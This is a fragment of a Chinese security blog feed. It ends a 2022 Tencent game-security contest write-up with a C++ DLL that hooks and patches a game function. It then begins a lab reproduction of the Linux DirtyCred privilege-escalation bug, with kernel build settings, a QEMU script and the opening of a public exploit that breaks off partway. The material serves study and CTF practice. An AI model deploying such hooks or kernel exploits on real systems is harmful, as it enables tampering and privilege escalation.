class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line">std::set&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 (*Func)(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);</span><br><span class="line"><span class="function">__int64 <span class="title">GetBaseAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hMode = <span class="built_in">GetModuleHandle</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> (__int64)hMode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* shellcode = <span class="number">0</span>;</span><br><span class="line">BYTE HookCode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,  <span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>                                           <span class="comment">//jmp rax </span></span><br><span class="line">&#125;;</span><br><span class="line">BYTE OriginCode[<span class="number">0x50</span>];</span><br><span class="line"><span class="type">size_t</span> HookLen = <span class="number">12</span>;</span><br><span class="line">__int64 times = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> k : s) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(%d,%d)\n&quot;</span>, k.first, k.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> val[] = &#123;<span class="number">5392533</span>,<span class="number">5934636</span>,<span class="number">9984722</span>,<span class="number">11102301</span>,<span class="number">7888111</span>,<span class="number">9846439</span>,<span class="number">4608533</span>,<span class="number">8744398</span>,<span class="number">7703662</span>,<span class="number">10004148</span>,<span class="number">8744654</span>&#125;;</span><br><span class="line">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;WrongPos[] = &#123;</span><br><span class="line">    &#123;<span class="number">-950</span>,<span class="number">50</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">-390</span>&#125;,</span><br><span class="line">    &#123;<span class="number">-950</span>,<span class="number">170</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">230</span>&#125;,</span><br><span class="line">    &#123;<span class="number">-950</span>,<span class="number">-210</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">350</span>&#125;,</span><br><span class="line">    &#123;<span class="number">-890</span>,<span class="number">-270</span>&#125;,</span><br><span class="line">    &#123;<span class="number">170</span>,<span class="number">-270</span>&#125;,</span><br><span class="line">    &#123;<span class="number">-770</span>,<span class="number">230</span>&#125;,</span><br><span class="line">    &#123;<span class="number">110</span>,<span class="number">-390</span>&#125;,</span><br><span class="line">    &#123;<span class="number">-830</span>,<span class="number">170</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;TargetPos[] = &#123;</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">50</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">110</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">170</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">230</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">290</span>&#125;,</span><br><span class="line">    &#123;<span class="number">50</span>,<span class="number">350</span>&#125;,</span><br><span class="line">    &#123;<span class="number">110</span>,<span class="number">110</span>&#125;,</span><br><span class="line">    &#123;<span class="number">170</span>,<span class="number">170</span>&#125;,</span><br><span class="line">    &#123;<span class="number">230</span>,<span class="number">230</span>&#125;,</span><br><span class="line">    &#123;<span class="number">110</span>,<span class="number">230</span>&#125;,</span><br><span class="line">    &#123;<span class="number">170</span>,<span class="number">230</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> CountOfWrongPos=<span class="number">11</span>;</span><br><span class="line"><span class="function">__int64 <span class="title">HackShellcode</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, OriginCode,HookLen);              <span class="comment">//unhook</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> x = a1, y = a2;</span><br><span class="line">    <span class="type">int</span> v13, v14;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountOfWrongPos; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (std::pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&#123; x,y &#125; == WrongPos[i]) &#123;</span><br><span class="line">            x = TargetPos[i].first;</span><br><span class="line">            y = TargetPos[i].second;</span><br><span class="line">            v13=x;</span><br><span class="line">    v14=x*(y<span class="number">+1</span>);</span><br><span class="line">            a3=val[i]^<span class="number">0x414345</span>;</span><br><span class="line">    a4=(<span class="type">unsigned</span> <span class="type">int</span>)((a3 ^ (y + v13)) % <span class="number">256</span></span><br><span class="line">                        + (((a3 ^ (v13 * y)) % <span class="number">256</span> + (((a3 ^ (y + v14)) % <span class="number">256</span>) &lt;&lt; <span class="number">8</span>)) &lt;&lt; <span class="number">8</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hook Value Success from position (%d,%d) to (%d,%d)\n&quot;</span>,a1,a2,x,y);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);</span><br><span class="line">    times--;</span><br><span class="line">    <span class="keyword">if</span> (times&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;call shellcode(%d,%d,%d,%d,%x) retval=%d\n&quot;</span>,x, y, a3, a4, a5, ret);          </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> presize = s.<span class="built_in">size</span>();</span><br><span class="line">    s.<span class="built_in">insert</span>(&#123; x,y &#125;);</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">size</span>() == presize) &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="built_in">printset</span>();</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//rehook</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HookShellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __int64 base = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    __int64 Ptr = base + <span class="number">0x8308</span>;</span><br><span class="line">    </span><br><span class="line">    shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">    <span class="keyword">while</span> (!shellcode) &#123;</span><br><span class="line">        shellcode = (<span class="type">void</span>*)(*(__int64*)Ptr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Find shellcode Fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode addr=%p\n&quot;</span>, shellcode);</span><br><span class="line">    <span class="built_in">memcpy</span>(OriginCode, shellcode,HookLen);              <span class="comment">//saved</span></span><br><span class="line">    Func FuncPtr = HackShellcode;</span><br><span class="line">    *(__int64*)(HookCode + <span class="number">2</span>) = (__int64)FuncPtr;       <span class="comment">//construct</span></span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, HookCode, HookLen);               <span class="comment">//hook</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">AllocConsole</span>();</span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;CONOUT$&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line">        <span class="built_in">HookShellcode</span>();</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果也是完美实现了</p><img src="/2024/03/19/tencent-race-2022-pre/17.png" class=""><hr><p>To be continue For Final in 2022.</p>]]></content>
    
    
    <summary type="html">复盘一下2022的腾讯游戏安全比赛</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>dirty cred(CVE-2021-4145)漏洞复现</title>
    <link href="https://xia0ji233.github.io/2024/03/13/CVE-2021-4145/"/>
    <id>https://xia0ji233.github.io/2024/03/13/CVE-2021-4145/</id>
    <published>2024-03-13T15:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.838Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下 dirty cred 漏洞</p><span id="more"></span><p>同样本篇文章采用的还是 环境配置——漏洞验证——源码分析——代码调试 这四部分。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="内核编译"><a href="#内核编译" class="headerlink" title="内核编译"></a>内核编译</h3><p>选用一个漏洞存在的版本，例如 <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.13.1.tar.gz">5.13.2</a>。</p><p>下面就是编译内核会踩得一些坑，我将完整复述一遍：</p><p>源码下载好之后，先 <code>make menuconfig</code> 开启调试符号，<code>kernel hacking-&gt;kernel debugging</code> 勾选，<code>kernel hacking-&gt;Compile-time checks and compiler options-&gt;Compile the kernel with debug info</code> 勾选。</p><p>保存退出之后还需要加上两个选项。</p><p><code>vim .config</code>，打开之后找到两个选项，一个是 <code>CONFIG_FUSE_FS</code> 另一个是 <code>CONFIG_USER_NS</code>，这两个选项都需要启动，默认生成的 <code>config</code> 应该是没有启用这两个选项的。</p><p>配置完成之后就可以开始编译了。</p><p>编译完成之后，在本目录下得到带完整符号的 <code>vmlinux</code>，在 <code>arch/x86/boot/</code> 得到启动内核 <code>bzImage</code></p><h3 id="文件系统编译"><a href="#文件系统编译" class="headerlink" title="文件系统编译"></a>文件系统编译</h3><p>依然是采用 busybox，方法和之前是一致的，看我最开始的<a href="https://xia0ji233.pro/2024/02/01/Linux_Kernel_Pwn1/">环境搭建</a>即可，这里可以提前把 EXP 编译进去然后打包文件系统。</p><h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h3><p>就是传说中的 <code>start.sh</code></p><p>这里给大家参考一下我的 qemu 启动参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-smp 2,cores=2,threads=1\</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.img \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot;\</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, \</span><br><span class="line">-device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-s -S\</span></span><br></pre></td></tr></table></figure><p>最后一行用于调试，大家不需要调试可以先注释掉，其它参数解释如下：</p><ol><li><code>-m 256M</code>: 指定虚拟机的内存大小为 256MB。</li><li><code>-smp 2,cores=2,threads=1</code>: 指定使用 2 个 CPU，每个 CPU 拥有 2 个核心，每个核心只有一个线程。</li><li><code>-kernel ./bzImage</code>: 指定了内核文件。</li><li><code>-initrd ./rootfs.img</code>: 指定我们制作的 Linux 文件系统。</li><li><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot;</code>:指定了传递给内核的启动参数。这里的 quiet 可以让内核不输出很多信息直接启动，<code>nokaslr</code> 一定要加，否则断点无法命中。</li><li><code>-cpu qemu64</code>: 指定使用 QEMU 的默认 x86_64 CPU 模拟器。</li><li><code>-netdev user,id=t0,</code>: 指定了用户模式网络设备。</li><li><code>-device e1000,netdev=t0,id=nic0</code>: 指定了要添加到虚拟机的网络设备。</li><li><code>-nographic</code>: 无需图形界面的情况下运行 QEMU。</li></ol><hr><p>现在在目录下应该有了 <code>start.sh</code>，<code>bzImage</code> 和 <code>rootfs.img</code>，文件系统可以提前打包 exp 进去。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="EXP验证"><a href="#EXP验证" class="headerlink" title="EXP验证"></a>EXP验证</h3><p>用网上通用的一个 EXP。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span> &#123;</span><br><span class="line">    va_list params;</span><br><span class="line"></span><br><span class="line">    va_start(params, fmt);</span><br><span class="line">    <span class="built_in">vfprintf</span>(<span class="built_in">stderr</span>, fmt, params);</span><br><span class="line">    va_end(params);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">use_temporary_dir</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *what, ...)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">        <span class="type">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">setup_common</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="number">0</span>, <span class="string">&quot;/sys/fs/fuse/connections&quot;</span>, <span class="string">&quot;fusectl&quot;</span>, <span class="number">0</span>, <span class="number">0</span>)) 